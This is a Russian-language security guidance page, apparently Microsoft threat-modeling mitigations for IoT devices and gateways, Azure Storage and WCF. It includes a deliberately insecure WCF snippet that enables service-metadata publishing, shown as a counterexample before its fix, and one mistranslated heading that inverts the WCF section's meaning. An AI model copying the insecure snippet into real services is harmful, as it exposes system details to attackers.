| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Windows 10 IoT Базовая предоставляет облегченную версию функции шифрования устройства с помощью технологии BitLocker. Во многом эта функция зависит от наличия доверенного платформенного модуля (TPM) на платформе, а также от протокола PreOS в UEFI, который выполняет необходимые измерения. Эти измерения гарантируют, что операционная система имеет необходимую запись о запуске. Мы рекомендуем шифровать разделы операционной системы и все дополнительные разделы с помощью технологии BitLocker, если на них хранятся конфиденциальные данные. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Включите минимальное количество служб и функций на устройстве

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Устройства Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Не включайте или отключите любые функции или службы в операционной системе, не влияющие на работу решения. Например, если для устройства не требуется развертывать пользовательский интерфейс, установите Windows IoT Core в режиме без монитора. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Шифруйте разделы операционной системы и дополнительные разделы полевого шлюза Интернета вещей с помощью BitLocker

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Полевой шлюз Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Windows 10 IoT Базовая предоставляет облегченную версию функции шифрования устройства с помощью технологии BitLocker. Во многом эта функция зависит от наличия доверенного платформенного модуля (TPM) на платформе, а также от протокола PreOS в UEFI, который выполняет необходимые измерения. Эти измерения гарантируют, что операционная система имеет необходимую запись о запуске. Мы рекомендуем шифровать разделы операционной системы и все дополнительные разделы с помощью технологии BitLocker, если на них хранятся конфиденциальные данные. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Измените учетные данные для входа в систему полевого шлюза по умолчанию во время установки

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Полевой шлюз Интернета вещей | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Измените учетные данные для входа в систему полевого шлюза по умолчанию во время установки |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Реализуйте процесс обновления встроенного ПО подключенных устройств в облачном шлюзе

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Облачный шлюз Интернета вещей | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Выбор шлюза: Центр Интернета вещей Azure |
| **Справочные материалы**              | [Общие сведения об управлении устройствами с помощью Центра Интернета вещей](../../iot-hub/iot-hub-device-management-overview.md), [сведения об обновлении встроенного ПО устройства](../../iot-hub/tutorial-firmware-update.md) |
| **Шаги** | LWM2M — это протокол управления устройствами Интернета вещей, предоставленный международной организацией по разработке открытых стандартов для мобильных телефонов (Open Mobile Alliance, OMA). Управление устройствами Azure IoT позволяет взаимодействовать с физическими устройствами, используя задания устройств. Убедитесь, что облачный шлюз регулярно обновляет устройство и данные конфигурации с помощью функции управления устройствами с помощью Центра Интернета вещей Azure. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Настройте элементы управления безопасностью конечных точек устройства в соответствии с политиками организации

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Отношения доверия между компьютерами | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | Недоступно  |
| **Шаги** | Убедитесь, что на устройстве настроены элементы управления безопасностью конечных точек, например шифрование BitLocker, выполняемое на уровне дисков, антивирусная программа с обновленными подписями, брандмауэр на основе узла, обновления операционной системы, групповые политики и т. д., в соответствии с политиками безопасности организации. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Обеспечьте безопасное управление ключами доступа к хранилищу Azure

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Хранилище Azure | 
| **Этап SDL**               | Развертывание |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Руководство по безопасности службы хранилища Azure. Управление ключами учетной записи хранения](../../storage/blobs/security-recommendations.md#identity-and-access-management) |
| **Шаги** | <p>Хранилище ключей. Мы рекомендуем хранить ключи доступа к хранилищу Azure в качестве секрета в Azure Key Vault и извлекать их оттуда, когда они понадобятся приложению. Это связано со следующими причинами.</p><ul><li>Приложение никогда не хранит жестко закодированный ключ хранилища в файле конфигурации, что устраняет риск получения доступа к ключам со стороны лиц, не имеющих соответствующих разрешений.</li><li>Доступом к ключам можно управлять с помощью Azure Active Directory. Это означает, что владелец учетной записи может предоставить доступ для нескольких приложений, извлекающих ключи из Azure Key Vault. Другие приложения не смогут получить доступ к ключам, не имея необходимых разрешений.</li><li>Повторное создание ключей. По соображениям безопасности мы рекомендуем внедрить процесс повторного создания ключей доступа к хранилищу Azure. Сведения о том, зачем и как это сделать, см. в руководстве по безопасности службы хранилища Azure.</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Настройте доступ к службе хранилища Azure с включенной технологией CORS только из доверенных источников

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | Хранилище Azure | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | Универсальный шаблон |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [Статья о поддержке CORS в службах хранилища Azure](/rest/api/storageservices/Cross-Origin-Resource-Sharing--CORS--Support-for-the-Azure-Storage-Services) |
| **Шаги** | Служба хранилища Azure позволяет включить CORS — общий доступ к ресурсам независимо от источника. Для каждой учетной записи хранения можно указать домены, которым разрешен доступ к ресурсам в ней. По умолчанию механизм CORS отключен для всех служб. Включить CORS можно с помощью REST API или клиентской библиотеки хранилища, вызвав один из методов для задания политик службы. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>Включите компонент регулирования служб WCF

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | WCF | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | .NET Framework 3 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Шаги** | <p>Если не задать ограничение на использование системных ресурсов, они могут исчерпаться, что в конечном счете может привести к отказу в обслуживании.</p><ul><li>**Пояснение**. Windows Communication Foundation (WCF) позволяет применить регулирование к запросам на обслуживание. Слишком большое количество клиентских запросов может привести к переполнению системы, в результате чего ее ресурсы могут исчерпаться. С другой стороны, при недостаточном количестве запросов к службе пользователи могут перестать использовать ее. Для каждой службы следует настроить необходимый объем ресурсов.</li><li>**Рекомендации.** Включите функцию регулирования служб WCF и задайте ограничения, соответствующие вашему приложению.</li></ul>|

### <a name="example"></a>Пример
Ниже приведен пример конфигурации с включенной функцией регулирования.
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Применяйте раскрытие информации через метаданные, переданные WCF

| Title                   | Сведения      |
| ----------------------- | ------------ |
| **Компонент**               | WCF | 
| **Этап SDL**               | Сборка |  
| **Применимые технологии** | .NET Framework 3 |
| **Атрибуты**              | Недоступно  |
| **Справочные материалы**              | [MSDN](/previous-versions/msp-n-p/ff648500(v=pandp.10)), [Fortify Kingdom](https://vulncat.fortify.com) |
| **Шаги** | Используя метаданные, злоумышленники могут получить сведения о системе и спланировать тип атаки. Службы WCF могут предоставлять метаданные. В этих метаданных содержится подробное описание службы, и поэтому их не следует передавать в рабочих средах. Свойства `HttpGetEnabled` / `HttpsGetEnabled` класса ServiceMetaData определяют, будет ли служба предоставлять метаданные. | 

### <a name="example"></a>Пример
Код ниже указывает WCF передавать метаданные службы.
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Не передавайте метаданные службы в рабочей среде. Задайте для свойства HttpGetEnabled или HttpsGetEnabled класса ServiceMetaData значение false. 

### <a name="example"></a>Пример
Код ниже указывает WCF не передавать метаданные службы. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```